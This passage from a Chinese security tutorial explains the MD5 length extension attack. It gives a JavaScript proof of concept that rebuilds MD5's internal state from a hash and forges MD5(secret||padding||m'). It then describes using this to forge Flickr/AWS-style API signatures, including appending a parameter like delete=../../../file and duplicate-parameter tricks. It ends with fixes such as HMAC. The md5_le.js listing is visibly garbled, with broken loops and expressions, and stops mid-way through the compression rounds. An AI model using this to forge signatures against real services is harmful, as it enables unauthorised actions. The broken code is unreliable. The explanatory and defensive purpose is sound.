数组后变为：
因为数据总共才有19个字节，不足64个字节，因此剩下部分需要经过padding。
padding后数据变为：
最后8个字节用以表示数据长度，为19*8 =152。
在对消息进行分组以及padding后，MD5算法开始依次对每组消息进行压缩，经过
64轮数学变换。在这个过程中，一开始会有定义好的初始化向量，为4个中间值，初始
化向量不是随机生成的，是标准里定义死的——是的，你没看错，这是“硬编码”！
然后经过64轮数学变换。
...
....
这是一个for循环，在进行完数学变换后，将改变临时中间值，这个值进入下一轮
for循环：
还记得前面那张MD5结构的图吗？这个for循环的过程，就是一次次的压缩过程。
上一次压缩的结果，将作为下一次压缩的输入。而Length Ex-tension的理论基础，就是
将已知的压缩后的结果，直接拿过来作为新的压缩输入。在这个过程中，只需要上一次
压缩后的结果，而不需要知道原来的消息内容是什么。实施Length Extension Attack
理解了Length Extension的原理后，接下来就需要实施这个攻击了。这里有几点需
要注意，首先是MD5值怎么还原为压缩函数中所需要的4个整数？
通过逆向MD5算法，不难实现这一点。
简单来说，就是先把MD5值拆分成4组，每组8个字节。比如：
9d391442efea4be3666caf8549bd4fd3
拆分为：
9d391442 efea4be3 666caf85 49bd4fd3
然后将这几个string转换为整数，再根据一系列的数学变化，还原成for循环里面需
要用到的h3,h2,h1,h0。
接下来将这4个值加入到MD5的压缩函数中，并产生新的值。此时就可以在后面附
加任意数据了。我们看看这个过程——
比如secret为0.12204316770657897，它只需要经过一轮MD5压缩。
从它的MD5值中可以直接还原出这4个中间值，同时我们希望附加消息“axis is
smart!”，并计算新消息的MD5值。
通过还原出secret压缩后的4个中间值，可以直接进行第二轮附加了消息的压缩，
从而在第一轮中产生了4个新的中间值，并以此生成新的MD5值。
为了验证结果是否正确，我们计算一下新的MD5(secret||padding||m')。
可以看到，MD5值和刚才计算出来的结果是一致的。
这段代码如下：
function print(str){
document.write(str);
}
print("=== MD5 Length Extension Attack POC
====== by axis ===");
// turn this to be true if want to see
internal state
debug = false;
var x = String(Math.random());
var append_m = 'axis is smart!';
print("[+] secret is :"+x+""+"[+] length
is :" + x.length+"");
print("[+] message want to append
is :"+append_m+"");
print("[+] Start calculating secret's
hash");
var old = faultylabs.MD5(x);
print("[+] Calculate secret's md5 hash:
"+old+"");
print("==============================
==");
print("[+] Start calculating new hash");
print("[+] theory: h(m||p||m1)");
print("[+] that is:
md5_compression_function('"+old+"',
'secret's length', '"+ append_m
+"')"+"");
var hash_guess = md5_length_extension(old,
x.length, append_m);
print("[+] padding(urlencode format) is: "+
escape(hash_guess['padding']) + "");
print("[+] guessing new hash is:
"+hash_guess['hash']+"");
print("==============================
==");
print("[+] now verifying the new hash");
var x1 = '';
x1 = x + hash_guess['padding'] + append_m;
print("[+] new message(urlencode format) is:
"+ escape(x1) +"");
var v = faultylabs.MD5(x1);
print("[+] md5 of the new message is:
"+v+"");
关键代码md5_le.js是patch MD5算法的实现，基于faultylabs的MD5实现而来，其
源代码附后。md5.js则是faultylabs的MD5实现，在此仅用于验证MD5值。
如何利用Length Extension Attack
如何利用Length Extension Attack呢？我们知道Length Extension使得可以在原文之
后附加任意值，并计算出新的哈希。最常见的地方就是签名。
一个合理的签名，一般需要salt或者key加上参数值，而salt或者key都是未知的，
也就使得原文是未知的。在Flickr API签名的问题中，FlickrAPI同时还犯了一个错误，
这个错误Amazon的AWS签名也犯过——就是在签名校验算法中，参数连接时没有使用
间隔符。所以本来如：
?a=1&b=2&c=3
的参数，在签名算法中连接时简单地变成了：
a1b2c3
那么攻击者可以伪造参数为：
?a=1b2c3[....Padding....]&b=4&c=5
最终在签名算法中连接时：
a1b2c3[....Padding....]b4c5
通过Length Extension可以生成一个新的合法的签名。这是第一种利用方法。
除此之外，因为可以附加新的参数，所以任意具有逻辑功能，但原文中未出现过的
参数都可以附加，比如：
?a=1&b=2&c=3&delete=../../../file&sig=sig_new
这是第二种攻击方式。
第三种攻击方式：还记得HPP吗？
附带相同的参数可能在不同的环境下造成不同的结果，从而产生一些逻辑漏洞。在
普通情况下，可以直接注入新参数，但如果服务器端校验了签名，则需要通过Length
Extension伪造一个新的签名才行。
?a=1&b=2&c=3&a=4&sig=sig_new
最后，Length Extension需要知道的length，其实是可以考虑暴力破解的。
Length Extension还有什么利用方式？尽情发挥你的想象力吧。How to Fix?
MD5、SHA-1之类的使用Merkle-Damg?rdhash construction的算法是没希望了。
使用HMAC-SHA1之类的HMAC算法吧，目前HMAC还没有发现过安全漏洞。
另外，针对Flickr API等将参数签名的应用来说，secret放置在参数末尾也能防止这
种攻击。
比如MD5(m+secret)，希望推导出MD5(m+secret||padding||m')，结果由于自动附
加se-cret在末尾的关系，会变成MD5(m||padding||m'||secret)，从而导致Length
Extension run不起来。
提供一些参考资料如下：
http://rdist.root.org/2009/10/29/stop-us-ing-unsafe-keyed-hashes-use-hmac/
http://en.wikipedia.org/wiki/SHA-1
http://utcc.utoronto.ca/~cks/space/blog/programming/HashLengthExtAttack
http://netifera.com/research/flickr_api_sig-nature_forgery.pdf
http://en.wikipedia.org/wiki/Merkle-Damg?rd_construction
http://www.ietf.org/rfc/rfc1321.txt
md5_le.js源代码如下：
md5_length_extension = function(m_md5,
m_len, append_m){
var result = new Array();
if (m_md5.length != 32){
alert("input error!");
return false;
}
// 将MD5值拆分成4组，每组8个字节
var m = new Array();
for (i=0;i> 0;
// convert of int128le_to_hex
var t=0;
var ta=0;
ta = m[x];
t = (ta & 0xFF);
ta = ta >>> 8;
t = t >> 8;
t = t >> 8;
t = t 64){
for (i=0;i<parseInt(m_len/64)*64;i++){
databytes.push('97'); // 填充任意字节
}
}
for (i=0;i<(m_len%64);i++){
databytes.push('97'); // 填充任意字节
}
// 调用padding
databytes = padding(databytes);
// 保存结果为padding，我们也需要这个结果
result['padding'] = '';
for (i=(parseInt(m_len/64)*64 + m_len
%64);i<databytes.length;i++){
result['padding'] +=
String.fromCharCode(databytes[i]);
}
// 将append_m 转换为数组添加
for (j=0;j<append_m.length;j++){
databytes.push(append_m.charCodeAt(j));
}
// 计算新的padding
databytes = padding(databytes);
var h0 = m[0];
var h1 = m[1];
var h2 = m[2];
var h3 = m[3];
var a=0,b=0,c=0,d=0;
// Digest message
// i=n 开始，因为从 append_b 开始压缩
for (i = parseInt(m_len/64)+1; i <
databytes.length / 64; i++) {
// initialize run
a = h0
b = h1
c = h2
d = h3
var ptr = i * 64
// do 64 runs
updateRun(fF(b, c, d), 0xd76aa478,
bytes_to_int32(databytes, ptr), 7)
updateRun(fF(b, c, d), 0xe8c7b756,
bytes_to_int32(databytes, ptr + 4), 12)
updateRun(fF(b, c, d), 0x242070db,
bytes_to_int32(databytes, ptr + 8), 17)
updateRun(fF(b, c, d), 0xc1bdceee,
bytes_to_int32(databytes, ptr + 12), 22)
updateRun(fF(b, c, d), 0xf57c0faf,
bytes_to_int32(databytes, ptr + 16), 7)
updateRun(fF(b, c, d), 0x4787c62a,
bytes_to_int32(databytes, ptr + 20), 12)
updateRun(fF(b, c, d), 0xa8304613,
bytes_to_int32(databytes, ptr + 24), 17)
updateRun(fF(b, c, d), 0xfd469501,
bytes_to_int32(databytes, ptr + 28), 22)
updateRun(fF(b, c, d), 0x698098d8,
bytes_to_int32(databytes, ptr + 32), 7)
updateRun(fF(b, c, d), 0x8b44f7af,
bytes_to_int32(databytes, ptr + 36), 12)
updateRun(fF(b, c, d), 0xffff5bb1,
bytes_to_int32(databytes, ptr + 40), 17)
updateRun(fF(b, c, d), 0x895cd7be,
bytes_to_int32(databytes, ptr + 44), 22)
updateRun(fF(b, c, d), 0x6b901122,
bytes_to_int32(databytes, ptr + 48), 7)
updateRun(fF(b, c, d), 0xfd987193,
bytes_to_int32(databytes, ptr + 52), 12)
updateRun(fF(b, c, d), 0xa679438e,
bytes_to_int32(databytes, ptr + 56), 17)